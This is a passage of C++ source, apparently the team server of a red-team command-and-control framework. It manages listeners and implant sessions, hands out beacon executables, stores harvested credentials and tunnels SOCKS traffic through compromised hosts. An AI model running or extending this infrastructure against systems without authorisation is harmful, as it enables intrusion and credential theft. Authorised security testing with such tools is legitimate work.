#include "TeamServer.hpp"

#include "TeamServerAuth.hpp"
#include "TeamServerBootstrap.hpp"
#include "TeamServerHelpService.hpp"
#include "TeamServerListenerSessionService.hpp"
#include "TeamServerRuntimeConfig.hpp"

#include <dlfcn.h>

#include <algorithm>
#include <cctype>
#include <functional>
#include <filesystem>
#include <unordered_map>
#include <sstream>
#include <iomanip>

using namespace std;
using namespace std::placeholders;
namespace fs = std::filesystem;

using json = nlohmann::json;

typedef ModuleCmd* (*constructProc)();

inline bool port_in_use(unsigned short port)
{

    return 0;
}

grpc::Status TeamServer::ensureAuthenticated(grpc::ServerContext* context)
{
    return m_authManager->ensureAuthenticated(context->client_metadata());
}

TeamServer::TeamServer(const nlohmann::json& config)
    : m_config(config), m_isSocksServerRunning(false), m_isSocksServerBinded(false)
{
    m_logger = createTeamServerLogger(config);

    TeamServerRuntimeConfig runtimeConfig = TeamServerRuntimeConfig::fromJson(config);
    m_teamServerModulesDirectoryPath = runtimeConfig.teamServerModulesDirectoryPath;
    m_linuxModulesDirectoryPath = runtimeConfig.linuxModulesDirectoryPath;
    m_windowsModulesDirectoryPath = runtimeConfig.windowsModulesDirectoryPath;
    m_linuxBeaconsDirectoryPath = runtimeConfig.linuxBeaconsDirectoryPath;
    m_windowsBeaconsDirectoryPath = runtimeConfig.windowsBeaconsDirectoryPath;
    m_toolsDirectoryPath = runtimeConfig.toolsDirectoryPath;
    m_scriptsDirectoryPath = runtimeConfig.scriptsDirectoryPath;

    runtimeConfig.validateDirectories(m_logger);
    runtimeConfig.configureCommonCommands(m_commonCommands);

    m_authManager = std::make_unique<TeamServerAuthManager>(m_logger);
    m_authManager->configure(config);
    m_helpService = std::make_unique<TeamServerHelpService>(
        m_logger,
        m_listeners,
        m_moduleCmd,
        m_commonCommands);
    m_listenerSessionService = std::make_unique<TeamServerListenerSessionService>(
        m_logger,
        m_config,
        m_listeners,
        m_moduleCmd,
        m_commonCommands,
        m_cmdResponses,
        m_sentResponses,
        m_sentC2Messages,
        [this](const std::string& input, C2Message& c2Message, bool isWindows)
        { return this->prepMsg(input, c2Message, isWindows); });

    // Modules
    m_logger->debug("TeamServer module directory path {0}", m_teamServerModulesDirectoryPath.c_str());
    std::size_t modulesLoaded = 0;
    try
    {
        for (const auto& entry : fs::recursive_directory_iterator(m_teamServerModulesDirectoryPath))
        {
            if (fs::is_regular_file(entry.path()) && entry.path().extension() == ".so")
            {
                m_logger->debug("Trying to load {0}", entry.path().c_str());

                void* handle = dlopen(entry.path().c_str(), RTLD_LAZY);

                if (!handle)
                {
                    m_logger->warn("Failed to load {0}", entry.path().c_str());
                    continue;
                }

                std::string funcName = entry.path().filename();
                funcName = funcName.substr(3);                        // remove lib
                funcName = funcName.substr(0, funcName.length() - 3); // remove .so
                funcName += "Constructor";                            // add Constructor

                m_logger->debug("Looking for construtor function {0}", funcName);

                constructProc construct = (constructProc)dlsym(handle, funcName.c_str());
                if (construct == NULL)
                {
                    m_logger->warn("Failed to find construtor");
                    dlclose(handle);
                    continue;
                }

                ModuleCmd* moduleCmd = construct();

                std::unique_ptr<ModuleCmd> moduleCmd_(moduleCmd);
                m_moduleCmd.push_back(std::move(moduleCmd_));

                runtimeConfig.configureModule(*m_moduleCmd.back());

                m_logger->debug("Module {0} loaded", entry.path().filename().c_str());
                modulesLoaded++;
            }
        }
    }
    catch (const std::filesystem::filesystem_error& e)
    {
        m_logger->warn("Error accessing module directory");
    }

    if (modulesLoaded == 0)
        m_logger->warn("No TeamServer modules loaded from {0}", m_teamServerModulesDirectoryPath.c_str());
    else
        m_logger->info("Loaded {0} TeamServer module(s) from {1}", modulesLoaded, m_teamServerModulesDirectoryPath.c_str());

    m_handleCmdResponseThreadRuning = true;
    m_handleCmdResponseThread = std::make_unique<std::thread>(&TeamServer::handleCmdResponse, this);
}

TeamServer::~TeamServer()
{
    m_handleCmdResponseThreadRuning = false;
    m_handleCmdResponseThread->join();

    m_isSocksServerBinded = false;
    if (m_socksThread)
        m_socksThread->join();
}

grpc::Status TeamServer::Authenticate(grpc::ServerContext* context, const teamserverapi::AuthRequest* request, teamserverapi::AuthResponse* response)
{
    (void)context;
    return m_authManager->authenticate(*request, *response);
}

// Get the list of liseteners from primary listeners
// and from listeners runing on beacon through sessionListener
grpc::Status TeamServer::GetListeners(grpc::ServerContext* context, const teamserverapi::Empty* empty, grpc::ServerWriter<teamserverapi::Listener>* writer)
{
    (void)empty;
    auto authStatus = ensureAuthenticated(context);
    if (!authStatus.ok())
        return authStatus;
    return m_listenerSessionService->streamListeners([&](const teamserverapi::Listener& listener)
        { return writer->Write(listener); });
}

// Add listener that will run on the C2
// To add a listener to a beacon the process it to send a command to the beacon
grpc::Status TeamServer::AddListener(grpc::ServerContext* context, const teamserverapi::Listener* listenerToCreate, teamserverapi::Response* response)
{
    auto authStatus = ensureAuthenticated(context);
    if (!authStatus.ok())
        return authStatus;
    return m_listenerSessionService->addListener(*listenerToCreate);
}

grpc::Status TeamServer::StopListener(grpc::ServerContext* context, const teamserverapi::Listener* listenerToStop, teamserverapi::Response* response)
{
    auto authStatus = ensureAuthenticated(context);
    if (!authStatus.ok())
        return authStatus;
    return m_listenerSessionService->stopListener(*listenerToStop, response);
}

bool TeamServer::isListenerAlive(const std::string& listenerHash)
{
    return m_listenerSessionService->isListenerAlive(listenerHash);
}

// Get the list of sessions on the primary listeners
// Primary listers old all the information about beacons linked to themeself and linked to beacon listerners
grpc::Status TeamServer::GetSessions(grpc::ServerContext* context, const teamserverapi::Empty* empty, grpc::ServerWriter<teamserverapi::Session>* writer)
{
    (void)empty;
    auto authStatus = ensureAuthenticated(context);
    if (!authStatus.ok())
        return authStatus;
    return m_listenerSessionService->streamSessions([&](const teamserverapi::Session& session)
        { return writer->Write(session); });
}

grpc::Status TeamServer::StopSession(grpc::ServerContext* context, const teamserverapi::Session* sessionToStop, teamserverapi::Response* response)
{
    auto authStatus = ensureAuthenticated(context);
    if (!authStatus.ok())
        return authStatus;
    return m_listenerSessionService->stopSession(*sessionToStop, response);
}

void TeamServer::socksThread()
{
    std::string dataIn;
    std::string dataOut;
    m_isSocksServerBinded = true;
    while (m_isSocksServerBinded)
    {
        // if session is killed (beacon probably dead) we end the server
        if (m_socksSession->isSessionKilled())
        {
            m_isSocksServerBinded = false;

            for (std::size_t i = 0; i < m_socksServer->tunnelCount(); i++)
                m_socksServer->resetTunnel(i);
        }

        C2Message c2Message = m_socksListener->getSocksTaskResult(m_socksSession->getBeaconHash());

        // if the beacon request stopSocks we end the server
        if (c2Message.instruction() == Socks5Cmd && c2Message.cmd() == StopSocksCmd)
        {
            m_socksServer->stop();
            m_isSocksServerBinded = false;

            for (std::size_t i = 0; i < m_socksServer->tunnelCount(); i++)
                m_socksServer->resetTunnel(i);
        }

        for (std::size_t i = 0; i < m_socksServer->tunnelCount(); i++)
        {
            SocksTunnelServer* tunnel = m_socksServer->getTunnel(i);

            if (tunnel != nullptr)
            {
                int id = tunnel->getId();
                SocksState state = tunnel->getState();
                if (state == SocksState::INIT)
                {
                    int ip = tunnel->getIpDst();
                    int port = tunnel->getPort();

                    m_logger->debug("Socks5 to {}:{}", std::to_string(ip), std::to_string(port));

                    C2Message c2MessageToSend;
                    c2MessageToSend.set_instruction(Socks5Cmd);
                    c2MessageToSend.set_cmd(InitCmd);
                    c2MessageToSend.set_data(std::to_string(ip));
                    c2MessageToSend.set_args(std::to_string(port));
                    c2MessageToSend.set_pid(id);

                    if (!c2MessageToSend.instruction().empty())
                        m_socksListener->queueTask(m_socksSession->getBeaconHash(), c2MessageToSend);

                    tunnel->setState(SocksState::HANDSHAKE);
                }
                else if (state == SocksState::HANDSHAKE)
                {
                    m_logger->trace("Socks5 wait handshake {}", id);

                    if (c2Message.instruction() == Socks5Cmd && c2Message.cmd() == InitCmd && c2Message.pid() == id)
                    {
                        m_logger->debug("Socks5 handshake received {}", id);

                        if (c2Message.data() == "fail")
                        {
                            m_logger->debug("Socks5 handshake failed {}", id);
                            m_socksServer->resetTunnel(i);
                        }
                        else
                        {
                            m_logger->debug("Socks5 handshake succed {}", id);
                            tunnel->finishHandshake();
                            tunnel->setState(SocksState::RUN);

                            dataIn = "";
                            int res = tunnel->process(dataIn, dataOut);

                            if (res <= 0)
                            {
                                m_logger->debug("Socks5 stop");

                                m_socksServer->resetTunnel(i);

                                C2Message c2MessageToSend;
                                c2MessageToSend.set_instruction(Socks5Cmd);
                                c2MessageToSend.set_cmd(StopCmd);
                                c2MessageToSend.set_pid(id);

                                if (!c2MessageToSend.instruction().empty())
                                    m_socksListener->queueTask(m_socksSession->getBeaconHash(), c2MessageToSend);
                            }
                            else
                            {
                                m_logger->debug("Socks5 send data to beacon");

                                C2Message c2MessageToSend;
                                c2MessageToSend.set_instruction(Socks5Cmd);
                                c2MessageToSend.set_cmd(RunCmd);
                                c2MessageToSend.set_pid(id);
                                c2MessageToSend.set_data(dataOut);

                                if (!c2MessageToSend.instruction().empty())
                                    m_socksListener->queueTask(m_socksSession->getBeaconHash(), c2MessageToSend);
                            }
                        }
                    }
                    else if (c2Message.instruction() == Socks5Cmd && c2Message.cmd() == StopCmd && c2Message.pid() == id)
                    {
                        m_socksServer->resetTunnel(i);
                    }
                }
                else if (state == SocksState::RUN)
                {
                    m_logger->trace("Socks5 run {}", id);

                    dataIn = "";
                    if (c2Message.instruction() == Socks5Cmd && c2Message.cmd() == RunCmd && c2Message.pid() == id)
                    {
                        m_logger->debug("Socks5 {}: data received from beacon", id);

                        dataIn = c2Message.data();

                        int res = tunnel->process(dataIn, dataOut);

                        m_logger->debug("Socks5 process, res {}, dataIn {}, dataOut {}", res, dataIn.size(), dataOut.size());

                        // TODO do we stop if dataOut.size()==0 ????
                        // if(res<=0 || dataOut.size()==0)
                        if (res <= 0)
                        {
                            m_logger->debug("Socks5 stop");

                            m_socksServer->resetTunnel(i);

                            C2Message c2MessageToSend;
                            c2MessageToSend.set_instruction(Socks5Cmd);
                            c2MessageToSend.set_cmd(StopCmd);
                            c2MessageToSend.set_pid(id);

                            if (!c2MessageToSend.instruction().empty())
                                m_socksListener->queueTask(m_socksSession->getBeaconHash(), c2MessageToSend);
                        }
                        else
                        {
                            m_logger->debug("Socks5 send data to beacon");

                            C2Message c2MessageToSend;
                            c2MessageToSend.set_instruction(Socks5Cmd);
                            c2MessageToSend.set_cmd(RunCmd);
                            c2MessageToSend.set_pid(id);
                            c2MessageToSend.set_data(dataOut);

                            if (!c2MessageToSend.instruction().empty())
                                m_socksListener->queueTask(m_socksSession->getBeaconHash(), c2MessageToSend);
                        }
                    }
                    else if (c2Message.instruction() == Socks5Cmd && c2Message.cmd() == StopCmd && c2Message.pid() == id)
                    {
                        m_socksServer->resetTunnel(i);
                    }
                }
            }
        }

        // Remove ended tunnels
        m_socksServer->cleanTunnel();

        std::this_thread::sleep_for(std::chrono::milliseconds(5));
    }

    m_logger->info("End SocksServer binding");

    return;
}

grpc::Status TeamServer::SendCmdToSession(grpc::ServerContext* context, const teamserverapi::Command* command, teamserverapi::Response* response)
{
    auto authStatus = ensureAuthenticated(context);
    if (!authStatus.ok())
        return authStatus;
    return m_listenerSessionService->sendCmdToSession(*command, response);
}

int TeamServer::handleCmdResponse()
{
    while (m_handleCmdResponseThreadRuning)
        m_listenerSessionService->handleCmdResponse();
    return 0;
}

grpc::Status TeamServer::GetResponseFromSession(grpc::ServerContext* context, const teamserverapi::Session* session, grpc::ServerWriter<teamserverapi::CommandResponse>* writer)
{
    auto authStatus = ensureAuthenticated(context);
    if (!authStatus.ok())
        return authStatus;
    return m_listenerSessionService->streamResponsesForSession(
        session->beaconhash(),
        context->client_metadata(),
        [&](const teamserverapi::CommandResponse& commandResponse)
        { return writer->Write(commandResponse); });
}

grpc::Status TeamServer::GetHelp(grpc::ServerContext* context, const teamserverapi::Command* command, teamserverapi::CommandResponse* commandResponse)
{
    auto authStatus = ensureAuthenticated(context);
    if (!authStatus.ok())
        return authStatus;
    return m_helpService->getHelp(*command, commandResponse);
}

// Split input based on spaces and single quotes
// Use single quote to passe aguments as a single parameters even if it's contain spaces
// Singles quotes are removed
void static inline splitInputCmd(const std::string& input, std::vector<std::string>& splitedList)
{
    std::string tmp = "";
    for (size_t i = 0; i < input.size(); i++)
    {
        char c = input[i];
        if (c == ' ')
        {
            if (!tmp.empty())
                splitedList.push_back(tmp);
            tmp = "";
        }
        else if (c == '\'')
        {
            i++;
            while (input[i] != '\'')
            {
                tmp += input[i];
                i++;
            }
        }
        else
        {
            tmp += c;
        }
    }

    if (!tmp.empty())
        splitedList.push_back(tmp);
}

std::string getIPAddress(std::string& interface)
{
    string ipAddress = "";
    struct ifaddrs* interfaces = NULL;
    struct ifaddrs* temp_addr = NULL;
    int success = 0;
    success = getifaddrs(&interfaces);
    if (success == 0)
    {
        temp_addr = interfaces;
        while (temp_addr != NULL)
        {
            if (temp_addr->ifa_addr != NULL && temp_addr->ifa_addr->sa_family == AF_INET)
            {
                if (strcmp(temp_addr->ifa_name, interface.c_str()) == 0)
                {
                    char addressBuffer[INET_ADDRSTRLEN];
                    inet_ntop(AF_INET, &((struct sockaddr_in*)temp_addr->ifa_addr)->sin_addr, addressBuffer, INET_ADDRSTRLEN);
                    ipAddress = addressBuffer;
                }
            }
            temp_addr = temp_addr->ifa_next;
        }
    }
    freeifaddrs(interfaces);
    return ipAddress;
}

const std::string InfoListenerInstruction = "infoListener";
const std::string GetBeaconBinaryInstruction = "getBeaconBinary";
const std::string PutIntoUploadDirInstruction = "putIntoUploadDir";
const std::string ReloadModulesInstruction = "reloadModules";
const std::string BatcaveInstruction = "batcaveUpload";
const std::string InstallInstruction = "install";
const std::string AddCredentialInstruction = "addCred";
const std::string GetCredentialInstruction = "getCred";
const std::string SocksInstruction_ = "socks";

grpc::Status TeamServer::SendTermCmd(grpc::ServerContext* context, const teamserverapi::TermCommand* command, teamserverapi::TermCommand* response)
{
    auto authStatus = ensureAuthenticated(context);
    if (!authStatus.ok())
        return authStatus;

    m_logger->trace("SendTermCmd");

    std::string cmd = command->cmd();
    m_logger->debug("SendTermCmd {0}", cmd);

    std::vector<std::string> splitedCmd;
    splitInputCmd(cmd, splitedCmd);

    teamserverapi::TermCommand responseTmp;
    std::string none = "";
    responseTmp.set_cmd(none);
    responseTmp.set_result(none);
    responseTmp.set_data(none);

    string instruction = splitedCmd[0];
    if (instruction == InfoListenerInstruction)
    {
        m_logger->debug("infoListener {0}", cmd);

        if (splitedCmd.size() == 2)
        {
            std::string listenerHash = splitedCmd[1];

            for (int i = 0; i < m_listeners.size(); i++)
            {
                const std::string& hash = m_listeners[i]->getListenerHash();

                // Check if the hash of the primary listener start with the given hash:
                if (hash.rfind(listenerHash, 0) == 0)
                {
                    std::string type = m_listeners[i]->getType();

                    std::string domainName = "";
                    auto it = m_config.find("DomainName");
                    if (it != m_config.end())
                        domainName = m_config["DomainName"].get<std::string>();

                    std::string exposedIp = "";
                    it = m_config.find("ExposedIp");
                    if (it != m_config.end())
                        exposedIp = m_config["ExposedIp"].get<std::string>();

                    std::string interface = "";
                    it = m_config.find("IpInterface");
                    if (it != m_config.end())
                        interface = m_config["IpInterface"].get<std::string>();

                    std::string ip = "";
                    if (!interface.empty())
                        ip = getIPAddress(interface);

                    if (ip.empty() && domainName.empty() && exposedIp.empty())
                    {
                        responseTmp.set_result("Error: No IP or Hostname in config.");
                        *response = responseTmp;
                        return grpc::Status::OK;
                    }

                    std::string port = m_listeners[i]->getParam2();
                    std::string uriFileDownload = "";

                    if (type == ListenerHttpType)
                    {
                        json configHttp = m_config["ListenerHttpConfig"];

                        auto it = configHttp.find("uriFileDownload");
                        if (it != configHttp.end())
                            uriFileDownload = configHttp["uriFileDownload"].get<std::string>();
                    }
                    else if (type == ListenerHttpsType)
                    {
                        json configHttps = m_config["ListenerHttpsConfig"];

                        auto it = configHttps.find("uriFileDownload");
                        if (it != configHttps.end())
                            uriFileDownload = configHttps["uriFileDownload"].get<std::string>();
                        ;
                    }

                    std::string finalDomain;
                    if (!domainName.empty())
                        finalDomain = domainName;
                    else if (!exposedIp.empty())
                        finalDomain = exposedIp;
                    else if (!ip.empty())
                        finalDomain = ip;

                    m_logger->debug("infoListener found in primary listeners {0} {1} {2}", type, finalDomain, port);

                    std::string result = type;
                    result += "\n";
                    result += finalDomain;
                    result += "\n";
                    result += port;
                    result += "\n";
                    result += uriFileDownload;

                    responseTmp.set_result(result);
                }
                // Check secondary listeners - smb / tcp:
                else
                {
                    // check for each sessions alive from this listener check if their is listeners
                    int nbSession = m_listeners[i]->getNumberOfSession();
                    for (int kk = 0; kk < nbSession; kk++)
                    {
                        std::shared_ptr<Session> session = m_listeners[i]->getSessionPtr(kk);

                        if (!session->isSessionKilled())
                        {
                            for (auto it = session->getListener().begin(); it != session->getListener().end(); ++it)
                            {

                                const std::string& hash = it->getListenerHash();

                                // Check if the hash of the primary listener start with the given hash:
                                if (hash.rfind(listenerHash, 0) == 0)
                                {
                                    // TODO we got an issue here to get the ip where the the listener can be contacted ? especialy for smb ?
                                    std::string type = it->getType();
                                    std::string param1 = it->getParam1();
                                    std::string param2 = it->getParam2();

                                    m_logger->debug("infoListener found in beacon listener {0} {1} {2}", type, param1, param2);

                                    std::string result = type;
                                    result += "\n";
                                    result += param1;
                                    result += "\n";
                                    result += param2;
                                    result += "\n";
                                    result += "none";

                                    responseTmp.set_result(result);
                                }
                            }
                        }
                    }
                }
            }

            if (responseTmp.result().empty())
            {
                m_logger->error("Error: Listener {} not found.", listenerHash);

                responseTmp.set_result("Error: Listener not found.");
                *response = responseTmp;
                return grpc::Status::OK;
            }
        }
        else
        {
            responseTmp.set_result("Error: infoListener take one arguement.");
            *response = responseTmp;
            return grpc::Status::OK;
        }
    }
    else if (instruction == GetBeaconBinaryInstruction)
    {
        m_logger->debug("getBeaconBinary {0}", cmd);

        if (splitedCmd.size() == 2 || splitedCmd.size() == 3)
        {
            std::string listenerHash = splitedCmd[1];

            std::string targetOs = "Windows";
            if (splitedCmd.size() == 3 && splitedCmd[2] == "Linux")
                targetOs = "Linux";

            for (int i = 0; i < m_listeners.size(); i++)
            {
                const std::string& hash = m_listeners[i]->getListenerHash();

                // Check if the hash of the primary listener start with the given hash:
                if (hash.rfind(listenerHash, 0) == 0)
                {
                    std::string type = m_listeners[i]->getType();
                    std::string beaconFilePath = "";
                    if (type == ListenerHttpType || type == ListenerHttpsType)
                    {
                        if (targetOs == "Linux")
                        {
                            beaconFilePath = m_linuxBeaconsDirectoryPath;
                            beaconFilePath += "BeaconHttp";
                        }
                        else
                        {
                            beaconFilePath = m_windowsBeaconsDirectoryPath;
                            beaconFilePath += "BeaconHttp.exe";
                        }
                    }
                    else if (type == ListenerTcpType)
                    {
                        if (targetOs == "Linux")
                        {
                            beaconFilePath = m_linuxBeaconsDirectoryPath;
                            beaconFilePath += "BeaconTcp";
                        }
                        else
                        {
                            beaconFilePath = m_windowsBeaconsDirectoryPath;
                            beaconFilePath += "BeaconTcp.exe";
                        }
                    }
                    else if (type == ListenerGithubType)
                    {
                        if (targetOs == "Linux")
                        {
                            beaconFilePath = m_linuxBeaconsDirectoryPath;
                            beaconFilePath += "BeaconGithub";
                        }
                        else
                        {
                            beaconFilePath = m_windowsBeaconsDirectoryPath;
                            beaconFilePath += "BeaconGithub.exe";
                        }
                    }
                    else if (type == ListenerDnsType)
                    {
                        if (targetOs == "Linux")
                        {
                            beaconFilePath = m_linuxBeaconsDirectoryPath;
                            beaconFilePath += "BeaconDns";
                        }
                        else
                        {
                            beaconFilePath = m_windowsBeaconsDirectoryPath;
                            beaconFilePath += "BeaconDns.exe";
                        }
                    }

                    std::ifstream beaconFile(beaconFilePath, std::ios::binary);
                    if (beaconFile.good())
                    {
                        m_logger->info("getBeaconBinary found in primary listeners {0} {1}", type, targetOs);

                        std::string binaryData((std::istreambuf_iterator<char>(beaconFile)), std::istreambuf_iterator<char>());
                        responseTmp.set_data(binaryData);
                        responseTmp.set_result("ok");
                    }
                    else
                    {
                        m_logger->error("Error: Beacons {0} {1} not found.", type, targetOs);

                        responseTmp.set_result("Error: Beacons not found.");
                        *response = responseTmp;
                        return grpc::Status::OK;
                    }
                }
                // Check secondary listeners - smb / tcp:
                else
                {
                    // check for each sessions alive from this listener check if their is listeners
                    int nbSession = m_listeners[i]->getNumberOfSession();
                    for (int kk = 0; kk < nbSession; kk++)
                    {
                        std::shared_ptr<Session> session = m_listeners[i]->getSessionPtr(kk);

                        if (!session->isSessionKilled())
                        {
                            for (auto it = session->getListener().begin(); it != session->getListener().end(); ++it)
                            {
                                const std::string& hash = it->getListenerHash();

                                // Check if the hash of the primary listener start with the given hash:
                                if (hash.rfind(listenerHash, 0) == 0)
                                {
                                    std::string type = it->getType();
                                    std::string param1 = it->getParam1();
                                    std::string param2 = it->getParam2();

                                    std::string beaconFilePath = "";
                                    if (type == ListenerTcpType)
                                    {
                                        if (targetOs == "Linux")
                                        {
                                            beaconFilePath = m_linuxBeaconsDirectoryPath;
                                            beaconFilePath += "BeaconTcp";
                                        }
                                        else
                                        {
                                            beaconFilePath = m_windowsBeaconsDirectoryPath;
                                            beaconFilePath += "BeaconTcp.exe";
                                        }
                                    }
                                    else if (type == ListenerSmbType)
                                    {
                                        if (targetOs == "Linux")
                                        {
                                            beaconFilePath = m_linuxBeaconsDirectoryPath;
                                            beaconFilePath += "BeaconSmb";
                                        }
                                        else
                                        {
                                            beaconFilePath = m_windowsBeaconsDirectoryPath;
                                            beaconFilePath += "BeaconSmb.exe";
                                        }
                                    }

                                    std::ifstream beaconFile(beaconFilePath, std::ios::binary);
                                    if (beaconFile.good())
                                    {
                                        m_logger->info("getBeaconBinary found in beacon listeners {0} {1}", type, targetOs);

                                        std::string binaryData((std::istreambuf_iterator<char>(beaconFile)), std::istreambuf_iterator<char>());
                                        responseTmp.set_data(binaryData);
                                        responseTmp.set_result("ok");
                                    }
                                    else
                                    {
                                        m_logger->error("Error: Beacons {0} {1} not found.", type, targetOs);

                                        responseTmp.set_result("Error: Beacons not found.");
                                        *response = responseTmp;
                                        return grpc::Status::OK;
                                    }
                                }
                            }
                        }
                    }
                }
            }

            if (responseTmp.result().empty())
            {
                responseTmp.set_result("Error: Listener not found.");
                *response = responseTmp;
                return grpc::Status::OK;
            }
        }
        else
        {
            responseTmp.set_result("Error: getBeaconBinary take one arguement.");
            *response = responseTmp;
            return grpc::Status::OK;
        }
    }
    else if (instruction == PutIntoUploadDirInstruction)
    {
        m_logger->debug("putIntoUploadDir {0}", cmd);

        if (splitedCmd.size() == 3)
        {
            std::string listenerHash = splitedCmd[1];

            std::string filename = splitedCmd[2];
            if (filename.find_first_not_of("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890-_.") != std::string::npos)
            {
                responseTmp.set_result("Error: filename not allowed.");
                *response = responseTmp;
                return grpc::Status::OK;
            }
            std::string data = command->data();

            std::string downloadFolder = "";
            for (int i = 0; i < m_listeners.size(); i++)
            {
                std::string hash = m_listeners[i]->getListenerHash();
                if (hash.find(listenerHash) != std::string::npos)
                {
                    std::string type = m_listeners[i]->getType();

                    try
                    {
                        if (type == ListenerHttpType)
                        {
                            json configHttp = m_config["ListenerHttpConfig"];

                            auto it = configHttp.find("downloadFolder");
                            if (it != configHttp.end())
                                downloadFolder = configHttp["downloadFolder"].get<std::string>();
                            ;
                        }
                        else if (type == ListenerHttpsType)
                        {
                            json configHttps = m_config["ListenerHttpsConfig"];

                            auto it = configHttps.find("downloadFolder");
                            if (it != configHttps.end())
                                downloadFolder = configHttps["downloadFolder"].get<std::string>();
                            ;
                        }
                    }
                    catch (...)
                    {
                        responseTmp.set_result("Error: Value not found in config file.");
                    }
                }
            }

            if (!downloadFolder.empty())
            {
                std::string filePath = downloadFolder;
                filePath += "/";
                filePath += filename;

                ofstream outputFile(filePath, ios::out | ios::binary);
                if (outputFile.good())
                {
                    outputFile << data;
                    outputFile.close();
                    responseTmp.set_result("ok");
                    m_logger->info("Stored uploaded file '{0}' for listener {1} in {2}", filename, listenerHash, filePath);
                }
                else
                {
                    responseTmp.set_result("Error: Cannot write file.");
                    m_logger->warn("Failed to store uploaded file '{0}' for listener {1} in {2}", filename, listenerHash, filePath);
                }
            }
            else
            {
                responseTmp.set_result("Error: Listener don't have a download folder.");
                m_logger->warn("Listener {0} has no download folder configured; unable to store {1}", listenerHash, filename);
            }
        }
        else
        {
            responseTmp.set_result("Error: putIntoUploadDir take tow arguements.");
            *response = responseTmp;
            return grpc::Status::OK;
        }
    }
    else if (instruction == BatcaveInstruction)
    {
        m_logger->debug("batcaveUpload {0}", cmd);
        if (splitedCmd.size() == 2)
        {
            std::string filename = splitedCmd[1];
            m_logger->debug("batcaveUpload {0}", filename);
            if (filename.find_first_not_of("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890-_.") != std::string::npos)
            {
                responseTmp.set_result("Error: filename not allowed.");
                *response = responseTmp;
                return grpc::Status::OK;
            }
            std::string data = command->data();
            std::string filePath = m_toolsDirectoryPath;
            filePath += "/";
            filePath += filename;

            ofstream outputFile(filePath, ios::out | ios::binary);
            if (outputFile.good())
            {
                outputFile << data;
                outputFile.close();
                responseTmp.set_result("ok");
                m_logger->info("Saved uploaded tool '{0}' to {1}", filename, filePath);
            }
            else
            {
                responseTmp.set_result("Error: Cannot write file.");
                m_logger->warn("Failed to store uploaded tool '{0}' at {1}", filename, filePath);
            }
            return grpc::Status::OK;
        }
    }
    // TODO handle some sort of backup
    else if (instruction == AddCredentialInstruction)
    {
        m_logger->debug("AddCredentials command received");

        std::string data = command->data();
        json cred = json::parse(data);
        m_credentials.push_back(cred);
        m_logger->info("Stored credential entry. Total credentials: {0}", m_credentials.size());
        responseTmp.set_result("ok");
        return grpc::Status::OK;
    }
    else if (instruction == GetCredentialInstruction)
    {
        m_logger->debug("GetCredentials command received");

        responseTmp.set_result(m_credentials.dump());
        *response = responseTmp;
        return grpc::Status::OK;
    }
    // TODO
    else if (instruction == ReloadModulesInstruction)
    {
        m_logger->info("Reloading TeamServer modules from directory: {0}", m_teamServerModulesDirectoryPath.c_str());

        // Clear previously loaded modules
        m_moduleCmd.clear();
        std::size_t reloadedModules = 0;

        try
        {
            for (const auto& entry : fs::recursive_directory_iterator(m_teamServerModulesDirectoryPath))
            {
                if (fs::is_regular_file(entry.path()) && entry.path().extension() == ".so")
                {
                    m_logger->debug("Trying to load {0}", entry.path().c_str());

                    void* handle = dlopen(entry.path().c_str(), RTLD_LAZY);
                    if (!handle)
                    {
                        m_logger->warn("Failed to load {0}: {1}", entry.path().c_str(), dlerror());
                        continue;
                    }

                    // Derive constructor function name
                    std::string funcName = entry.path().filename();
                    funcName = funcName.substr(3);                        // remove lib
                    funcName = funcName.substr(0, funcName.length() - 3); // remove .so
                    funcName += "Constructor";                            // add Constructor

                    m_logger->debug("Looking for constructor function: {0}", funcName);

                    constructProc construct = (constructProc)dlsym(handle, funcName.c_str());
                    if (!construct)
                    {
                        m_logger->warn("Failed to find constructor: {0}", dlerror());
                        dlclose(handle);
                        continue;
                    }

                    ModuleCmd* moduleCmd = construct();
                    if (!moduleCmd)
                    {
                        m_logger->warn("Constructor returned null");
                        dlclose(handle);
                        continue;
                    }

                    std::unique_ptr<ModuleCmd> moduleCmdPtr(moduleCmd);
                    TeamServerRuntimeConfig runtimeConfig = TeamServerRuntimeConfig::fromJson(m_config);
                    runtimeConfig.configureModule(*moduleCmdPtr);

                    m_logger->debug("Module {0} loaded", entry.path().filename().c_str());
                    m_moduleCmd.push_back(std::move(moduleCmdPtr));
                    reloadedModules++;
                }
            }
        }
        catch (const std::filesystem::filesystem_error& e)
        {
            m_logger->warn("Error accessing module directory: {0}", e.what());
        }

        if (reloadedModules == 0)
            m_logger->warn("No TeamServer modules loaded from {0}", m_teamServerModulesDirectoryPath.c_str());
        else
            m_logger->info("Reloaded {0} TeamServer module(s) from {1}", reloadedModules, m_teamServerModulesDirectoryPath.c_str());
    }
    else if (instruction == SocksInstruction_)
    {
        m_logger->debug("socks {0}", cmd);
        if (splitedCmd.size() >= 2)
        {
            std::string cmd = splitedCmd[1];

            // Start a thread that handle all the communication with the beacon
            if (cmd == "start")
            {
                if (m_isSocksServerRunning == true)
                {
                    m_logger->warn("Error: Socks server is already running");
                    responseTmp.set_result("Error: Socks server is already running");
                    *response = responseTmp;
                    return grpc::Status::OK;
                }
                else
                {
                    // TODO put the port in config
                    int port = 1080;

                    bool isPortInUse = port_in_use(port);
                    if (!isPortInUse)
                    {
                        m_socksServer = std::make_unique<SocksServer>(port);

                        int maxAttempt = 3;
                        int attempts = 0;
                        while (!m_socksServer->isServerLaunched())
                        {
                            m_socksServer->stop();
                            m_socksServer->launch();
                            std::this_thread::sleep_for(std::chrono::milliseconds(1000));
                            m_logger->debug("Wait for SocksServer to start on port {}", port);
                            attempts++;
                            if (attempts > maxAttempt)
                            {
                                m_logger->error("Error: Unable to start the socks server on port {} after {} attempts", port, maxAttempt);
                                break;
                            }
                        }

                        if (m_socksServer->isServerStoped())
                        {
                            m_logger->warn("Error: Socks server failed to start on port {}", port);
                            responseTmp.set_result("Error: Socks server failed to start on port " + std::to_string(port));
                            *response = responseTmp;
                            return grpc::Status::OK;
                        }

                        m_isSocksServerRunning = true;

                        m_logger->info("Socks server successfully started on port {}", port);
                        responseTmp.set_result("Socks server successfully started on port " + std::to_string(port));
                        *response = responseTmp;
                        return grpc::Status::OK;
                    }
                    else
                    {
                        m_logger->warn("Error: Socks server port already used");
                        responseTmp.set_result("Error: Socks server port already used");
                        *response = responseTmp;
                        return grpc::Status::OK;
                    }
                }
            }
            else if (cmd == "stop")
            {
